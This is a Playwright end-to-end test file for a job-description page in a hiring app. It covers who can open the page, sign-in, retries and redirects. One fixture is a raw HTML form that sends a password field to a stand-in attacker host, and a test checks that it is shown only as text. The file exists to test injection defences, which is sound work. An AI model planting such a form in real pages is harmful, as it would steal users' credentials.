import { expect, test, type APIRequestContext, type Page } from '@playwright/test';
import {
	API_URL,
	JWT_SECRET,
	apiAs,
	blockGoogle,
	candidateSession,
	gotoHydrated,
	ownerSession,
	recruiterSession,
	signIn,
	type OwnerSession
} from './support/owner';
import { createJob, deleteJobs, type RecruiterJob } from './support/jobs';
import { stubApi } from './support/api';
import { stubGoogle } from './support/google';

// The private page of a job description (/opportunities/:id), the link of the meeting invitation
// of a hiring journey. The e2e recruiter picks one of its open jobs on the job step of
// 'e2e-shared' (seeded by `bun run --cwd server seed:e2e` with a job step then the meeting; only
// this file picks on it): that portfolio's owner reads the job there, its recruiter is sent on to
// their own page of it, anyone else reads that it is not shared with them. The recruiter is shared
// with the other recruiter files, which run in parallel: this file names its postings with its own
// tag and removes them afterwards (and those an interrupted run left, by their prefix). The owner's
// account is read, never changed: its session check and the space the page records (PUT /me/mode)
// are answered in the browser. Google is never reached (its sign-in is stubbed).

test.skip(
	!JWT_SECRET,
	'Set JWT_SECRET to the API’s secret to sign in as the e2e owner and recruiter'
);

const DOMAIN = 'e2e-shared';
const TAG_PREFIX = 'view';
let tag = '';
let TITLE = '';
// A posting id nobody has
const UNKNOWN_ID = '65e2e00000000000000000aa';
// Raw HTML a recruiter wrote in the description: shown as text (JobDetails, html={false})
const RAW_FORM =
	'<form action="https://attacker.example/collect"><input name="password" type="password"></form>';

let owner: OwnerSession;
let recruiterApi: APIRequestContext;
let job: RecruiterJob;

/** The e2e-shared owner as GET /isLogged describes it: a portfolio, no space chosen yet */
const ownerUser = () => ({
	_id: owner.ownerId,
	email: 'e2e.shared@example.com',
	recruiter: false,
	domain: DOMAIN
});

/**
 * Answers the owner's account in the browser: GET /isLogged (signed in while `signedIn()` says
 * so) and PUT /me/mode, the space the page records, so the shared owner is never changed. Returns
 * the spaces recorded.
 */
const stubOwnerAccount = async (page: Page, signedIn: () => boolean = () => true) => {
	await stubApi(page, 'GET', '/isLogged', () => ({
		json: signedIn() ? { logged: true, user: ownerUser(), expires: owner.exp } : { logged: false }
	}));
	return stubApi(page, 'PUT', '/me/mode', (request) => ({
		json: { user: { ...ownerUser(), activeMode: request.postDataJSON().mode } }
	}));
};

// eslint-disable-next-line no-empty-pattern -- the fixtures come first, and none is needed here
test.beforeAll(async ({}, testInfo) => {
	tag = `${TAG_PREFIX}-${testInfo.workerIndex}-${Date.now().toString(36)}`;
	TITLE = `Staff Engineer ${tag}`;
	owner = await ownerSession(DOMAIN);
	recruiterApi = await apiAs(await recruiterSession());
	// What an interrupted run left behind
	await deleteJobs(recruiterApi, new RegExp(`\\b${TAG_PREFIX}-\\d+-[0-9a-z]+\\b`));
	job = await createJob(recruiterApi, {
		title: TITLE,
		status: 'open',
		description: `## The job\n\nCreated by an end-to-end test.\n\n${RAW_FORM}`
	});
	// Picked on the job step, as the Hire page sends it
	const picked = await recruiterApi.post(`${API_URL}/workflow/domains/${DOMAIN}/steps/job`, {
		data: { input: { jobId: job._id } }
	});
	expect(picked.ok(), `${await picked.text()}: run \`bun run --cwd server seed:e2e\``).toBe(true);
});

test.afterAll(async () => {
	if (recruiterApi && tag) await deleteJobs(recruiterApi, tag);
	await recruiterApi?.dispose();
});

test.beforeEach(async ({ page }) => {
	await blockGoogle(page);
});

test('the owner reads the job the recruiter picked on their journey, on a page not listed', async ({
	page
}) => {
	await signIn(page, owner);
	const spaces = await stubOwnerAccount(page);
	const response = await gotoHydrated(page, `/opportunities/${job._id}`);
	expect(response?.headers()['x-robots-tag']).toMatch(/\bnoindex\b/);

	await expect(page.getByRole('heading', { level: 1 })).toHaveText('Job description');
	await expect(page.getByText('Shared in a hiring journey')).toBeVisible();
	await expect(page.getByRole('heading', { level: 2, name: TITLE })).toBeVisible();
	await expect(page.getByText('E2E Corp')).toBeVisible();
	await expect(page.getByText(/45,000/)).toBeVisible();
	await expect(page.getByRole('heading', { name: 'About the job' })).toBeVisible();
	// The description's raw HTML stays text: it cannot add a form to the page
	await expect(page.locator('form[action^="https://attacker.example"]')).toHaveCount(0);
	await expect(page.locator('input[type="password"]')).toHaveCount(0);
	await expect(page.getByText(RAW_FORM, { exact: false })).toBeVisible();
	// Dated, and says who else can open it
	await expect(page.getByText(/^Opened \d+ \w+ \d{4}$/)).toBeVisible();
	await expect(
		page.getByText(
			"This page is private: only this job description's recruiter and the portfolio owners on whose hiring journey it was picked can open it."
		)
	).toBeVisible();
	await expect(page).toHaveTitle(`${TITLE} | Portfolio`);
	await expect(page.locator('meta[name="robots"]')).toHaveAttribute('content', /\bnoindex\b/);
	await expect(page.locator('link[rel="canonical"]')).toHaveCount(0);
	// Read in the candidate space, which the page records for an account with a portfolio
	await expect
		.poll(() => spaces.map((request) => request.postDataJSON()))
		.toEqual([{ mode: 'candidate' }]);
});

test('signed out, the owner signs in from the page and reads the job', async ({ page }) => {
	const google = await stubGoogle(page);
	// Signed out on arrival; signed in once POST /login answered, with the API's auth cookie a
	// real sign-in leaves (the page's request for the job goes to the API with it)
	let signedIn = false;
	await stubOwnerAccount(page, () => signedIn);
	const logins = await stubApi(page, 'POST', '/login', async () => {
		await page.context().addCookies([
			{
				name: 'auth',
				value: owner.token,
				url: API_URL,
				httpOnly: true,
				sameSite: 'Strict',
				expires: owner.exp
			}
		]);
		signedIn = true;
		return { json: { user: ownerUser(), expires: owner.exp } };
	});

	await gotoHydrated(page, `/opportunities/${job._id}`);
	await expect(
		page.getByRole('heading', { name: 'Sign in to read this job description' })
	).toBeVisible();
	// Nothing reaches Google's sign-in before the visitor asks for it
	expect(google).toEqual([]);
	await page.getByRole('button', { name: 'Sign in with Google' }).click();
	await page.getByRole('button', { name: 'Stub Google sign-in' }).click();

	await expect(page.getByRole('heading', { level: 2, name: TITLE })).toBeVisible();
	// The account keeps the space it last chose: no space in the sign-in
	expect(logins.map((request) => request.postDataJSON())).toEqual([{ token: 'stub-credential' }]);
});

test('an answer that failed can be retried', async ({ page }) => {
	await signIn(page, owner);
	await stubOwnerAccount(page);
	let failing = true;
	const failed = await stubApi(page, 'GET', '/opportunities/jobs/*', () =>
		failing ? { status: 500, json: { message: 'Internal Server Error' } } : undefined
	);

	await gotoHydrated(page, `/opportunities/${job._id}`);
	await expect(
		page.getByRole('heading', { name: 'Could not load this job description' })
	).toBeVisible();
	await expect(page.getByText(TITLE)).toHaveCount(0);

	failing = false;
	await page.getByRole('button', { name: 'Try again' }).click();
	await expect(page.getByRole('heading', { level: 2, name: TITLE })).toBeVisible();
	expect(failed).toHaveLength(1);
});

test('a session the API no longer knows asks to sign in again', async ({ page }) => {
	await signIn(page, owner);
	await stubOwnerAccount(page);
	const refused = await stubApi(page, 'GET', '/opportunities/jobs/*', () => ({
		status: 401,
		json: { message: 'Unauthorized' }
	}));

	await gotoHydrated(page, `/opportunities/${job._id}`);
	await expect(
		page.getByRole('heading', { name: 'Sign in to read this job description' })
	).toBeVisible();
	await expect(page.getByRole('button', { name: 'Sign in with Google' })).toBeVisible();
	await expect(page.getByText(TITLE)).toHaveCount(0);
	expect(refused).toHaveLength(1);
	// The session the browser kept is gone with it
	expect(
		(await page.evaluate(() => localStorage.getItem('authenticationStore'))) ?? ''
	).not.toContain(owner.ownerId);
});

test('signing out while the job is on its way asks to sign in, and never shows it', async ({
	page
}) => {
	await signIn(page, owner);
	await stubOwnerAccount(page);
	await stubApi(page, 'GET', '/logout', () => ({ json: { logged: false } }));
	// The job's answer waits until the account signed out
	let release = () => {};
	const signedOut = new Promise<void>((resolve) => (release = resolve));
	const held = await stubApi(page, 'GET', '/opportunities/jobs/*', async () => {
		await signedOut;
		return { json: { access: 'journey', job: { ...job, description: 'Held.' } } };
	});

	await gotoHydrated(page, `/opportunities/${job._id}`);
	await page.locator('[data-account-menu]').click();
	await page.getByRole('menuitem', { name: 'Log out' }).click();
	await expect(page.locator('[data-account-menu]')).toHaveCount(0);
	release();

	await expect(
		page.getByRole('heading', { name: 'Sign in to read this job description' })
	).toBeVisible();
	await expect.poll(() => held.length).toBe(1);
	await expect(page.getByText(TITLE)).toHaveCount(0);
});

test('the link of an invitation sent before still opens it', async ({ page, request }) => {
	const moved = await request.get(`/jobs/${job._id}?lang=fr`, { maxRedirects: 0 });
	expect(moved.status()).toBe(308);
	expect(moved.headers()['location']).toBe(`/opportunities/${job._id}?lang=fr`);

	await signIn(page, owner);
	await stubOwnerAccount(page);
	await gotoHydrated(page, `/jobs/${job._id}`);
	await expect(page).toHaveURL(new RegExp(`/opportunities/${job._id}$`));
	await expect(page.getByRole('heading', { level: 2, name: TITLE })).toBeVisible();
});

test('the recruiter who shared it is sent on to their own page of it', async ({ page }) => {
	await signIn(page, await recruiterSession());
	await gotoHydrated(page, `/opportunities/${job._id}`);

	await expect(page).toHaveURL(new RegExp(`/recruiter/jobs/${job._id}$`));
	await expect(page.getByRole('heading', { level: 2, name: TITLE })).toBeVisible();
	await expect(page.getByRole('link', { name: 'Edit' })).toBeVisible();
});

test('anyone else reads that it is not shared with them, as for a posting nobody has', async ({
	page
}) => {
	// The e2e candidate: no portfolio, nothing shared with it (it reads only: nothing to answer)
	await signIn(page, await candidateSession());
	for (const id of [job._id, UNKNOWN_ID, 'not-an-id']) {
		await gotoHydrated(page, `/opportunities/${id}`);
		await expect(
			page.getByRole('heading', { name: 'This job description is not shared with you' })
		).toBeVisible();
		await expect(page.getByText(TITLE)).toHaveCount(0);
		await expect(page.getByText(/You are signed in as/)).toContainText('e2e.candidate@example.com');
		await expect(page.getByRole('link', { name: 'Go to the home page' })).toHaveAttribute(
			'href',
			'/'
		);
	}
	// In French too
	await gotoHydrated(page, `/opportunities/${UNKNOWN_ID}?lang=fr`);
	await expect(page.getByRole('heading', { level: 1 })).toHaveText("Offre d'emploi");
	await expect(
		page.getByRole('heading', { name: "Cette offre d'emploi n'est pas partagée avec vous" })
	).toBeVisible();
});

test('signed out, it asks to sign in, and shows nothing of the job', async ({ page }) => {
	const asked: string[] = [];
	page.on('request', (request) => {
		if (request.url().startsWith(`${API_URL}/opportunities/`)) asked.push(request.url());
	});
	await gotoHydrated(page, `/opportunities/${job._id}`);

	await expect(
		page.getByRole('heading', { name: 'Sign in to read this job description' })
	).toBeVisible();
	await expect(page.getByRole('button', { name: 'Sign in with Google' })).toBeVisible();
	await expect(page.getByText(TITLE)).toHaveCount(0);
	expect(asked).toEqual([]);
});
